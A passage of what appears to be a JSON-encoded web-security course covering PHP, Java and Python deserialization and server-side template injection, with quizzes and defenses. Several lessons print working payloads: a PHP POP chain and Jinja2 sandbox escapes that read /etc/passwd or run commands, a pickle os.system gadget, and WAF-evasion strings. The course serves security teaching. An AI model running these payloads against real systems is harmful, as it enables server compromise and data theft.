safe_name</code></pre>\n</div>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Chapter Summary:</strong><br>\n  ① <strong>Rule 1:</strong> Never use blacklists. Only admit pre-approved, safe extension allowlists.<br>\n  ② <strong>Rule 2:</strong> Always enforce server-side UUID renaming, and physically strip execution handlers from upload directories.</p>\n</div>\n","checkpoints":[{"question":"What is the modern architectural gold standard for permanently eliminating file upload RCE risk?","options":["Manually wiping the server directory daily","Storing assets directly in Object Storage (AWS S3/OSS) and serving them via cookieless, non-executable CDN domains","Posting warning labels on administrator monitors","Limiting users to a single upload per day"],"answer":1,"explanation":"Offloading uploads to object storage keeps payloads off application servers, and static CDNs lack execution environments."},{"question":"On standalone web servers, what is the most critical Nginx hardening directive for upload folders?","options":["location ~* /uploads/.*\\.php$ { deny all; } to disable script execution","keepalive_timeout 0;","worker_processes auto;","gzip off;"],"answer":0,"explanation":"Explicitly blocking script interpreters from executing files inside upload directories ensures uploaded scripts cannot run."}]},
  "web-07-01": {"html":"\n<h2>Deserialization Fundamentals & PHP Magic Methods</h2>\n\n<p>When software transmits or persists in-memory objects (such as complex user account structures containing nested properties), those structures cannot travel across network sockets directly. The runtime must flatten the memory object into a continuous text or byte stream—this is <strong>Serialization</strong>. When the recipient receives the stream, it inflates the bytes back into an active in-memory object—this is <strong>Deserialization</strong>.</p>\n\n<p>Consider an intuitive analogy: You purchase modular flat-pack furniture. The factory disassembles the table and packs it into a flat cardboard box (serialization). Upon receipt, you reassemble the pieces back into a standing table (deserialization). But what if an attacker sneaks an explosive device disguised as a table leg into the flat pack? As soon as you follow the assembly instructions to the final step, the device detonates. This is <strong>Insecure Deserialization</strong>!</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Understand the lifecycle of serialized data: converting object state to transferable bytes and back<br>\n  ② Decipher PHP serialized string notations (<code>O:</code> Object, <code>s:</code> String, <code>i:</code> Integer, <code>a:</code> Array)<br>\n  ③ Map automatic trigger conditions for core PHP magic methods (<code>__construct</code>, <code>__destruct</code>, <code>__wakeup</code>, <code>__toString</code>)<br>\n  ④ Modify serialized attributes and predict instantiation side effects</p>\n</div>\n\n<h3>Step 1: PHP Serialization Notation Cheat Sheet</h3>\n\n<p>Given a class: <code>class User { public $name = \"admin\"; public $age = 18; }</code>, its serialized form reads:</p>\n<div class=\"code-block\">\n<pre><code class=\"language-text\">O:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:18;}</code></pre>\n</div>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Type Token</th><th>Grammar Example</th><th>Semantic Meaning</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong><code>O:len:\"class\":count</code></strong></td>\n      <td><code>O:4:\"User\":2</code></td>\n      <td>Object of class \"User\" (4 bytes long) containing 2 property entries</td>\n    </tr>\n    <tr>\n      <td><strong><code>s:len:\"val\";</code></strong></td>\n      <td><code>s:5:\"admin\";</code></td>\n      <td>String literal whose length byte count must match exactly</td>\n    </tr>\n    <tr>\n      <td><strong><code>i:number;</code></strong></td>\n      <td><code>i:18;</code></td>\n      <td>Signed integer value</td>\n    </tr>\n    <tr>\n      <td><strong><code>b:0/1;</code></strong></td>\n      <td><code>b:1;</code></td>\n      <td>Boolean flag (1 = true, 0 = false)</td>\n    </tr>\n    <tr>\n      <td><strong><code>a:count:{...}</code></strong></td>\n      <td><code>a:1:{...}</code></td>\n      <td>Associative or indexed array containing N key-value pairs</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Core PHP Magic Methods Trigger Matrix</h3>\n\n<p>Magic methods prefixed with double underscores <code>__</code> execute automatically upon specific runtime triggers:</p>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Magic Method</th><th>Automatic Invocation Trigger</th><th>Role in Exploitation Gadget Chains</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong><code>__wakeup()</code></strong></td>\n      <td>Invoked immediately upon calling <code>unserialize()</code></td>\n      <td>Standard <strong>Entry Point</strong> of deserialization gadget chains</td>\n    </tr>\n    <tr>\n      <td><strong><code>__destruct()</code></strong></td>\n      <td>Triggered when an object is destroyed or the script ends execution</td>\n      <td>Guaranteed execution sink even without an explicit wakeup handler</td>\n    </tr>\n    <tr>\n      <td><strong><code>__toString()</code></strong></td>\n      <td>Triggered whenever an object is treated as a string (e.g. <code>echo $obj</code>)</td>\n      <td>Acts as a bridge connecting disparate classes</td>\n    </tr>\n    <tr>\n      <td><strong><code>__call()</code></strong></td>\n      <td>Triggered when invoking an inaccessible or undefined method</td>\n      <td>Redirects execution flow across disjoint libraries</td>\n    </tr>\n  </tbody>\n</table>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Chapter Summary:</strong><br>\n  ① Deserialization does not serialize executable code methods; it reconstructs object properties.<br>\n  ② Vulnerabilities detonate when user-controlled strings are passed to <code>unserialize()</code> and pre-existing codebase methods perform dangerous actions on those properties.</p>\n</div>\n","checkpoints":[{"question":"In PHP, which magic method executes automatically the instant an object is created via unserialize()?","options":["__construct()","__wakeup()","__destruct()","__toString()"],"answer":1,"explanation":"__wakeup() is invoked automatically by PHP right after an object is materialized via unserialize()."},{"question":"In the PHP serialized token O:4:\"User\":1:{...}, what does the leading 'O' represent?","options":["Operation command","Object","Byte Offset","Output stream"],"answer":1,"explanation":"The 'O' token denotes an Object, followed by its class name length, class name, and property count."}]},
  "web-07-02": {"html":"\n<h2>PHP POP Chain Construction & Object Injection</h2>\n\n<p>In real-world codebases, developers rarely embed overt calls like <code>system($_GET['cmd'])</code> directly inside a single class destructor. Instead, attackers construct a domino effect by stitching together benign classes across the application: Class A's destructor calls a method on Class B, which triggers a string conversion in Class C, terminating in arbitrary file manipulation. This methodology is known as <strong>Property-Oriented Programming (POP Chains)</strong>.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Master the three architectural pillars of a POP chain: <strong>Source, Gadget, and Sink</strong><br>\n  ② Link disparate classes by injecting object instances into member properties<br>\n  ③ Trace and synthesize an end-to-end PHP POP exploit chain<br>\n  ④ Calculate exact serialization length offsets to prevent parser desynchronization</p>\n</div>\n\n<h3>Step 1: Anatomy of a POP Chain Domino</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-php\">&lt;?php\n// Class 1: Entry Point Source\nclass ShowText {\n    public $source;\n    public function __destruct() {\n        // Echoing $source coerces it into a string!\n        echo $this-&gt;source; \n    }\n}\n\n// Class 2: Gadget Bridge to Sensitive Sink\nclass ReadFile {\n    public $filename;\n    public function __toString() {\n        // String coercion opens the file designated by $filename\n        return file_get_contents($this-&gt;filename);\n    }\n}\n\n// Target entry point\nunserialize($_GET['payload']);\n?&gt;</code></pre>\n</div>\n\n<p><strong>Execution Flow:</strong></p>\n<ol>\n  <li>When script execution terminates, <code>ShowText::__destruct()</code> runs automatically.</li>\n  <li>Assigning <code>ShowText-&gt;source</code> to an instance of <code>ReadFile</code> causes <code>echo</code> to trigger <code>ReadFile::__toString()</code>.</li>\n  <li>Setting <code>ReadFile-&gt;filename = \"/etc/passwd\"</code> dumps sensitive system files to standard output.</li>\n</ol>\n\n<h3>Step 2: Exploit Payload Synthesis Script</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-php\">&lt;?php\n$payload = new ShowText();\n$payload-&gt;source = new ReadFile();\n$payload-&gt;source-&gt;filename = \"/etc/passwd\";\n\necho urlencode(serialize($payload));\n?&gt;</code></pre>\n</div>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Chapter Summary:</strong><br>\n  ① <strong>POP Chain Trio:</strong> Source (entry via magic method) &rarr; Gadgets (intermediate stepping stones) &rarr; Sink (dangerous sink function).<br>\n  ② <strong>Byte-Length Integrity:</strong> Modifying serialized property values manually requires synchronizing the preceding <code>s:length</code> prefix exactly.</p>\n</div>\n","checkpoints":[{"question":"In Property-Oriented Programming (POP Chains), what is a 'Gadget'?","options":["A physical hardware device used by the tester","Pre-existing codebase classes and methods strung together to transfer execution from an entry point to a dangerous sink","A browser extension plugin","A database table trigger"],"answer":1,"explanation":"Gadgets are stepping-stone code blocks within the application classpath stitched together via property injection."},{"question":"If an attacker modifies a serialized string from s:5:\"admin\" to s:5:\"administrator\" and unserialize() fails, what is the root cause?","options":["The length prefix s:5 was not updated to match the 13-character length (s:13)","PHP forbids the administrator username string","Database table locks","Browser charset discrepancies"],"answer":0,"explanation":"PHP strict parser deserialization rejects strings whose declared byte length does not match the actual string literal."}]},
  "web-07-03": {"html":"\n<h2>Java Deserialization & Apache Commons Collections Gadgets</h2>\n\n<p>While PHP deserialization chains rely on language-level magic methods, <strong>Java native deserialization</strong> represents an enterprise-grade threat vector. Over the past decade, critical Remote Code Execution vulnerabilities across major middleware—WebLogic, JBoss, Apache Shiro, and Jenkins—have rooted themselves in Java deserialization and the iconic <strong>Apache Commons Collections (CC) gadget chains</strong>.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Recognize binary Java serialization wire protocols: Magic bytes <code>AC ED 00 05</code> and <code>Serializable</code> interfaces<br>\n  ② Understand the canonical execution gateway: the <code>readObject()</code> lifecycle method<br>\n  ③ Analyze dynamic reflection invocation gadgets using <code>InvokerTransformer</code><br>\n  ④ Understand the mechanics of the industry-standard payload tool <strong>ysoserial</strong></p>\n</div>\n\n<h3>Step 1: Java Deserialization Signatures Cheat Sheet</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Format</th><th>Binary / Encoded Signature</th><th>Inspection & Traffic Vectors</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Raw Hex Magic Bytes</strong></td>\n      <td><code>AC ED 00 05</code></td>\n      <td>Raw TCP network sockets, RMI protocol handshakes</td>\n    </tr>\n    <tr>\n      <td><strong>Base64 Encoded Stream</strong></td>\n      <td>Starts with <code>rO0AB...</code> (Base64 representation of <code>aced0005</code>)</td>\n      <td>HTTP headers (Apache Shiro <code>rememberMe</code> cookies), serialized POST bodies</td>\n    </tr>\n    <tr>\n      <td><strong>Contract Requirement</strong></td>\n      <td>Class implements <code>java.io.Serializable</code></td>\n      <td>Mandatory marker interface required for JVM object marshaling</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Commons Collections Chain Architecture</h3>\n\n<ol>\n  <li><strong>Source:</strong> During <code>readObject()</code> deserialization, container classes (e.g. <code>AnnotationInvocationHandler</code>) access their encapsulated Maps.</li>\n  <li><strong>Chained Transformers:</strong> The Commons Collections library provides decorators like <code>LazyMap</code> or <code>TransformedMap</code> wired to a <code>ChainedTransformer</code> array.</li>\n  <li><strong>Sink:</strong> An <code>InvokerTransformer</code> invokes Java reflection methods dynamically, escalating to <code>Runtime.getRuntime().exec()</code> for full system compromise.</li>\n</ol>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Chapter Summary:</strong><br>\n  ① Seeing <code>rO0AB</code> anywhere in HTTP cookies or payloads confirms Java deserialized data streams.<br>\n  ② Vulnerabilities do not require flaws in business application logic; having common vulnerable dependencies (Commons Collections, Spring, Groovy) in the classpath is sufficient for GetShell.</p>\n</div>\n","checkpoints":[{"question":"When inspecting network traffic, a Base64-encoded parameter starting with 'rO0AB' universally signifies:","options":["A Java native serialized object stream (magic bytes AC ED 00 05)","An AES symmetric encryption key","An RSA public key certificate","A PNG image artifact"],"answer":0,"explanation":"Java serialization protocol magic bytes 0xACED0005 encode deterministically to 'rO0AB' in standard Base64."},{"question":"In Java native deserialization, which method is invoked by default to reconstruct object state?","options":["main()","readObject()","finalize()","clone()"],"answer":1,"explanation":"The ObjectInputStream invokes readObject() during deserialization, serving as the standard entry point for gadget execution."}]},
  "web-07-04": {"html":"\n<h2>Python Pickle Exploitation & Ultimate Deserialization Defense</h2>\n\n<p>In Python applications, the built-in <code>pickle</code> module is widely used to serialize runtime objects into files or Redis caches. However, the official Python documentation features an unambiguous security warning: <strong>\"Never unpickle data received from an untrusted or unauthenticated source\"</strong>. Unlike simple serialization routines, <code>pickle</code> operates an internal stack machine capable of invoking arbitrary functions.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Understand how Python's <strong><code>__reduce__</code> magic method</strong> enables arbitrary code execution<br>\n  ② Author weaponized 5-line Python pickle payloads<br>\n  ③ Enforce safe data-only serialization protocols: <strong>JSON and Protocol Buffers (Protobuf)</strong><br>\n  ④ Configure strict look-ahead class allowlists (Java JEP 290 filters)</p>\n</div>\n\n<h3>Step 1: The Python <code>__reduce__</code> Primitive</h3>\n\n<p>When an object is unpickled, the <code>__reduce__</code> protocol instructs the engine to return a callable and argument tuple: <code>(callable, args)</code>:</p>\n\n<div class=\"code-block\">\n<pre><code class=\"language-python\">import pickle\nimport os\n\nclass Exploit(object):\n    def __reduce__(self):\n        return (os.system, ('whoami',))\n\n# Generate malicious serialized stream\nmalicious_bytes = pickle.dumps(Exploit())\n\n# Vulnerable server execution executes 'whoami' immediately!\npickle.loads(malicious_bytes)</code></pre>\n</div>\n\n<h3>Step 2: Deserialization Defense Matrix Cheat Sheet</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Strategy</th><th>Technical Implementation</th><th>Security Guarantee & Scope</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>1. Pure Data Formats (Golden Standard)</strong></td>\n      <td>Migrate strictly to <strong>JSON</strong> or <strong>Protocol Buffers</strong></td>\n      <td><strong>100% Elimination</strong>: Pure data representations lack execution capabilities entirely</td>\n    </tr>\n    <tr>\n      <td><strong>2. Strict Class Allowlists (JEP 290)</strong></td>\n      <td>Enforce <code>jdk.serialFilter</code> or override <code>resolveClass</code></td>\n      <td>Permit only foundational types (String, Integer); reject all gadget classes</td>\n    </tr>\n    <tr>\n      <td><strong>3. Cryptographic Signatures (HMAC)</strong></td>\n      <td>Sign serialized blobs with secret keys before transmission</td>\n      <td>Validates data integrity before deserialization commences</td>\n    </tr>\n  </tbody>\n</table>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Chapter Summary:</strong><br>\n  ① <strong>Architectural Standard:</strong> Eliminate native object serializers (Java native, Python pickle, PHP unserialize) in favor of JSON/Protobuf across microservices.<br>\n  ② <strong>Signatures Require Key Confidentiality:</strong> Using default keys (e.g. Apache Shiro default AES keys) renders cryptographic integrity useless.</p>\n</div>\n","checkpoints":[{"question":"In Python pickle exploitation, which magic method returns a tuple enabling arbitrary system command execution?","options":["__init__","__reduce__","__str__","__len__"],"answer":1,"explanation":"The __reduce__ protocol returns a callable and arguments tuple (e.g. os.system, ('cmd',)), detonating during pickle.loads()."},{"question":"What is the industry-standard architectural best practice for permanently neutralizing deserialization RCE risk?","options":["Transitioning strictly to pure data-interchange formats like JSON or Protobuf","Rotating server administrative passwords monthly","Injecting random spaces into serialized streams","Applying Base64 encoding across all objects"],"answer":0,"explanation":"Pure data formats like JSON and Protobuf lack object lifecycle bindings or magic method invocations, eliminating RCE by design."}]},
  "web-08-01": {"html":"\n<h2>SSTI Fundamentals & Template Engine Detection</h2>\n\n<p><strong>Server-Side Template Injection (SSTI)</strong> occurs when an application embeds user-supplied input directly into a server-side template without proper sanitization, instead of binding variables as structured data context. By supplying native template directives, attackers can force the server to evaluate expressions, extract internal variables, and eventually achieve Remote Code Execution (RCE).</p>\n\n<p>Consider an intuitive real-world analogy: An administrative printing system generates diplomas with the pattern \"Congratulations [Name] on your graduation\". Normally, the user's name is inserted as plain, unparsed text. However, if the developer mistakenly concatenates the name directly into the formatting logic, an adversary entering \"<code>{{7*7}}</code>\" will not receive \"Congratulations {{7*7}}\". Instead, the template engine identifies its own syntax, executes the mathematical multiplication, and prints \"Congratulations 49\"! Once arbitrary expressions can be calculated on the server, full operating system compromise is just steps away.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Understand the core vulnerability mechanism: Dynamic template string concatenation vs. parameterized data context<br>\n  ② Master syntax differentiation across popular engines: Jinja2, Twig, Smarty, FreeMarker, and Velocity<br>\n  ③ Apply heuristic multi-step detection trees using mathematical probes like <code>{{7*7}}</code> and <code>{{7*'7'}}</code><br>\n  ④ Accurately profile underlying programming runtimes (Python vs. PHP vs. JVM)</p>\n</div>\n\n<h3>Step 1: Heuristic Detection Matrix (Cheat Sheet)</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Test Payload</th><th>Rendered Output</th><th>Candidate Template Engines</th><th>Follow-up Confirmation Vector</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>${7*7}</code></td>\n      <td><code>49</code></td>\n      <td>FreeMarker, Velocity, Thymeleaf (Java/JVM)</td>\n      <td><code>${\"freemarker.template.utility.Execute\"?new()(\"id\")}</code></td>\n    </tr>\n    <tr>\n      <td><code>{{7*7}}</code></td>\n      <td><code>49</code></td>\n      <td>Jinja2 (Python), Twig (PHP), Tornado</td>\n      <td>Test <code>{{7*'7'}}</code> to differentiate Python vs. PHP</td>\n    </tr>\n    <tr>\n      <td><code>{{7*'7'}}</code></td>\n      <td><code>7777777</code></td>\n      <td><strong>Jinja2 / Tornado (Python)</strong>: Python string multiplication semantics</td>\n      <td>Traverse <code>__class__.__mro__</code> for sandbox escape</td>\n    </tr>\n    <tr>\n      <td><code>{{7*'7'}}</code></td>\n      <td><code>49</code></td>\n      <td><strong>Twig (PHP)</strong>: PHP loose type casting (coerces string to integer)</td>\n      <td>Invoke <code>{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"id\")}}</code></td>\n    </tr>\n    <tr>\n      <td><code>&lt;%= 7*7 %&gt;</code></td>\n      <td><code>49</code></td>\n      <td>ERB (Ruby), EJS (Node.js)</td>\n      <td><code>&lt;%= system('id') %&gt;</code> or <code>&lt;%= global.process.mainModule.require('child_process').execSync('id') %&gt;</code></td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Root Cause Code Comparison</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-python\"># [VULNERABLE CODE] Insecure: Direct string concatenation into template engine\nfrom flask import Flask, request, render_template_string\napp = Flask(__name__)\n\n@app.route(\"/greet\")\ndef greet():\n    name = request.args.get(\"name\", \"Guest\")\n    # FATAL FLAW: Untrusted input becomes part of the template definition itself!\n    template = f\"&lt;h1&gt;Hello {name}!&lt;/h1&gt;\"\n    return render_template_string(template)\n\n# [SECURE CODE] Robust: Passing user input as isolated context data\n@app.route(\"/safe_greet\")\ndef safe_greet():\n    name = request.args.get(\"name\", \"Guest\")\n    # SECURE: Input is strictly treated as variable data; template grammar is immutable\n    template = \"&lt;h1&gt;Hello {{ name }}!&lt;/h1&gt;\"\n    return render_template_string(template, name=name)</code></pre>\n</div>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Exercise:</strong><br>\n  During a security assessment, sending <code>/?name={{7*7}}</code> yields <code>Hello 49!</code>, and sending <code>/?name={{7*'7'}}</code> yields <code>Hello 7777777!</code>. What is the target runtime and template engine?<br>\n  <strong>Answer:</strong> Python runtime with Jinja2 (or Tornado). In Python, multiplying a string by an integer repeats the string (<code>'7' * 7 = '7777777'</code>), whereas PHP Twig coerces strings to numbers and outputs <code>49</code>.<br><br>\n  <strong>Chapter Summary:</strong><br>\n  ① SSTI is caused by treating user input as executable template source code rather than passive parameter data.<br>\n  ② Systematic probing with <code>{{7*7}}</code> and <code>{{7*'7'}}</code> quickly maps the exact backend runtime.</p>\n</div>\n","checkpoints":[{"question":"During a blackbox assessment, submitting the payload `{{7*'7'}}` returns `7777777`. What template engine stack does this behavior indicate?","options":["PHP with Twig template engine","Python runtime (e.g., Jinja2 or Tornado)","Java with FreeMarker template engine","Node.js with EJS template engine"],"answer":1,"explanation":"In Python, multiplying a string by an integer repeats the string ('7' * 7 = '7777777'). In PHP Twig, loose type coercion converts '7' to an integer and computes 49. Hence, this is a signature Jinja2/Python response."},{"question":"In PortSwigger's template engine identification decision tree, if `${7*7}` is reflected verbatim, `{{7*7}}` evaluates to `49`, and `{{7*'7'}}` also evaluates to `49` (rather than `7777777`), which engine is indicated?","options":["Twig (PHP)","Jinja2 (Python)","Freemarker (Java)","Velocity (Java)"],"answer":0,"explanation":"In Twig (PHP), the string '7' undergoes type juggling into integer 7, causing {{7*'7'}} to evaluate arithmetically to 49. In Python Jinja2, multiplying a string replicates it, yielding 7777777."}]},
  "web-08-02": {"html":"\n<h2>Jinja2 & Python Sandbox Escape Mechanics</h2>\n\n<p>Once a target application is confirmed to execute Python under Jinja2, attackers pivot from basic expression evaluation to bypassing template isolation. Through <strong>Python object inheritance tree traversal</strong>, an adversary navigates memory references to acquire system execution primitives.</p>\n\n<p>Consider an intuitive real-world analogy: You are confined in a strictly monitored room (the Jinja2 sandbox) with no tools except a single blade of straw (an empty string <code>\"\"</code>). You trace the straw back to its producer (the <code>__class__</code> definition), climb up the family genealogy tree (<code>__mro__</code>), and inspect every living descendant of the ultimate ancestor (<code>__subclasses__()</code>). Among thousands of subclasses in memory, you spot the commander of the castle armory (<code>subprocess.Popen</code> or <code>os._wrap_close</code>), commanding him directly to unlock the gates and execute your shell instructions!</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Master foundational Python reflection attributes: <code>__class__</code>, <code>__mro__</code>, and <code>__subclasses__()</code><br>\n  ② Climb from primitive types (strings, tuples, dicts) back to root <code>object</code><br>\n  ③ Identify actionable gadget classes: <code>os._wrap_close</code>, <code>warnings.catch_warnings</code>, and <code>subprocess.Popen</code><br>\n  ④ Author robust RCE payloads leveraging <code>__init__.__globals__</code> namespaces</p>\n</div>\n\n<h3>Step 1: Python Reflection Attributes Reference</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Special Attribute / Method</th><th>Core Functionality</th><th>Code Example</th><th>Output / Objective</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>__class__</code></td>\n      <td>Retrieves the class to which an instance belongs</td>\n      <td><code>\"\".__class__</code></td>\n      <td><code>&lt;class 'str'&gt;</code> (Maps primitive to type)</td>\n    </tr>\n    <tr>\n      <td><code>__mro__</code> / <code>__bases__</code></td>\n      <td>Method Resolution Order tuple showing the inheritance hierarchy</td>\n      <td><code>\"\".__class__.__mro__</code></td>\n      <td><code>(&lt;class 'str'&gt;, &lt;class 'object'&gt;)</code> (Reaches root object)</td>\n    </tr>\n    <tr>\n      <td><code>__subclasses__()</code></td>\n      <td>Returns a list of all currently loaded subclasses inheriting from the type</td>\n      <td><code>\"\".__class__.__mro__[1].__subclasses__()</code></td>\n      <td>Yields hundreds of loaded classes across the Python runtime</td>\n    </tr>\n    <tr>\n      <td><code>__init__.__globals__</code></td>\n      <td>Accesses the global dictionary of the module where the method was defined</td>\n      <td><code>cls.__init__.__globals__</code></td>\n      <td>Exposes imported modules such as <code>os</code>, <code>sys</code>, and <code>__builtins__</code></td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Canonical Sandbox Escape Exploitation</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-python\"># 1. Enumerate subclasses to locate classes exposing the os module:\n{{ \"\".__class__.__mro__[1].__subclasses__() }}\n\n# 2. Assuming os._wrap_close resides at index 132, leverage its globals to reach popen:\n{{ \"\".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read() }}\n\n# 3. Read sensitive server files via __builtins__.open:\n{{ \"\".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}\n\n# 4. Direct process spawning using subprocess.Popen:\n{{ \"\".__class__.__mro__[1].__subclasses__()[200]('whoami',shell=True,stdout=-1).communicate()[0].strip() }}</code></pre>\n</div>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Exercise:</strong><br>\n  Run a small local Python 3 snippet to programmatically find the exact index of <code>os._wrap_close</code> in your environment:<br>\n  <pre><code class=\"language-python\">for idx, cls in enumerate(\"\".__class__.__mro__[1].__subclasses__()):\n    if \"wrap_close\" in cls.__name__:\n        print(f\"Found os._wrap_close at index: {idx}\")</code></pre>\n  <strong>Chapter Summary:</strong><br>\n  ① Jinja2 sandbox escapes exploit Python's introspective object model to locate reachable gadgets.<br>\n  ② Utilizing <code>__init__.__globals__</code> allows adversaries to break out of scoped constraints and invoke arbitrary system calls.</p>\n</div>\n","checkpoints":[{"question":"In Python Jinja2 sandbox escape chains, which method is used to retrieve all loaded direct subclasses inheriting from a base type?","options":["__class__.__bases__","__mro__","__subclasses__()","__init__.__globals__"],"answer":2,"explanation":"`__subclasses__()` is a built-in Python method on class objects that returns a list of all currently loaded direct subclasses. Calling it on root `object` exposes hundreds of candidate gadget classes in memory."},{"question":"When inspecting classes from `().__class__.__base__.__subclasses__()` in a Jinja2 sandbox escape, which reference do attackers typically seek inside `__init__.__globals__` to execute OS commands?","options":["The os module or popen function (e.g., accessed via classes like os._wrap_close or subprocess.Popen)","The math.sin trigonometric calculation function","The pseudorandom seed generator from the random library","The standard graphical canvas renderer from turtle"],"answer":0,"explanation":"An object's __init__.__globals__ exposes the module-level dictionary where the class was declared. Classes like os._wrap_close reside in modules that import os, allowing attackers to access os.popen() or os.system() directly to execute operating system commands."}]},
  "web-08-03": {"html":"\n<h2>SSTI Bypasses & Ultimate Template Hardening</h2>\n\n<p>In production environments, applications frequently enforce input filters or Web Application Firewalls (WAFs) blocking quotes (<code>'</code>, <code>\"</code>), dots (<code>.</code>), underscores (<code>_</code>), or square brackets (<code>[]</code>). This micro-lesson details proven evasion techniques and comprehensive defense-in-depth architecture.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Evade quote filtering via Flask request objects (<code>request.args</code>, <code>request.cookies</code>)<br>\n  ② Bypass dot restrictions using Jinja2 <code>|attr()</code> filter and subscript lookups<br>\n  ③ Circumvent bracket filtering via <code>__getitem__()</code> or <code>pop()</code><br>\n  ④ Enforce secure template rendering and configure Jinja2 <code>SandboxedEnvironment</code></p>\n</div>\n\n<h3>Step 1: WAF Evasion Reference Table</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Filtering Condition</th><th>Evasion Vector</th><th>Payload Example</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Quotes Blocked</strong> (<code>'</code> / <code>\"</code>)</td>\n      <td>Offload string literals to external HTTP parameters via <code>request.args</code></td>\n      <td><code>{{ ()|attr(request.args.c)|attr(request.args.m) }}&amp;c=__class__&amp;m=__base__</code></td>\n    </tr>\n    <tr>\n      <td><strong>Dots Blocked</strong> (<code>.</code>)</td>\n      <td>Use bracket indexing or Jinja2's built-in <code>|attr()</code> filter</td>\n      <td><code>{{ ()['__class__']['__base__']['__subclasses__']() }}</code></td>\n    </tr>\n    <tr>\n      <td><strong>Brackets Blocked</strong> (<code>[]</code>)</td>\n      <td>Use the <code>__getitem__()</code> method or <code>pop()</code> method on lists</td>\n      <td><code>{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(132) }}</code></td>\n    </tr>\n    <tr>\n      <td><strong>Underscores Blocked</strong> (<code>_</code>)</td>\n      <td>Pass strings in headers or cookies and resolve via <code>request.cookies</code></td>\n      <td><code>{{ ()|attr(request.cookies.payload) }}</code> with <code>Cookie: payload=__class__</code></td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Robust Production Defense Architecture</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-python\"># Principle 1: Never concatenate untrusted strings into template definitions!\n# Always pass data via standard template context variables:\nreturn render_template(\"profile.html\", username=user_input)\n\n# Principle 2: If dynamic template customization is unavoidable, enforce SandboxedEnvironment:\nfrom jinja2.sandbox import SandboxedEnvironment\n\nenv = SandboxedEnvironment()\ntry:\n    # SandboxedEnvironment intercepts access to dangerous attributes like __class__, __mro__, __globals__\n    template = env.from_string(\"Hello {{ user_input }}\")\n    output = template.render(user_input=untrusted_data)\nexcept Exception as e:\n    output = \"Security Exception: Prohibited attribute access blocked.\"</code></pre>\n</div>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Exercise:</strong><br>\n  If a WAF strictly drops requests containing the keyword <code>class</code>, how can you evade detection using Flask's request parameter binding?<br>\n  <strong>Answer:</strong> Issue a request such as <code>/?payload={{\"\"|attr(request.args.a)}}&amp;a=__class__</code>. The WAF inspects the <code>payload</code> query parameter, which remains clean, while the Jinja2 engine resolves <code>request.args.a</code> dynamically at runtime.<br><br>\n  <strong>Chapter Summary:</strong><br>\n  ① Parameter decoupling via <code>request.args</code> or cookies offers reliable WAF evasion.<br>\n  ② Complete remediation requires parameterized rendering or strict <code>SandboxedEnvironment</code> constraints.</p>\n</div>\n","checkpoints":[{"question":"What is the most robust and fundamental remediation against SSTI vulnerabilities?","options":["Implementing a regex blacklist filtering double braces `{{` and `}}`","Passing user input exclusively via parameterized template context variables instead of string concatenation","Converting all user inputs to uppercase before rendering","Relying solely on frontend JavaScript sanitization"],"answer":1,"explanation":"SSTI stems from interpreting untrusted input as executable template source code. Parameterizing data via context variables ensures the engine treats input purely as passive text data, completely neutralizing injection risks."},{"question":"In Jinja2 SSTI exploitation, if security filters strictly strip period (`.`) and underscore (`_`) characters, which built-in filter is commonly utilized to dynamically resolve attributes?","options":["|attr() 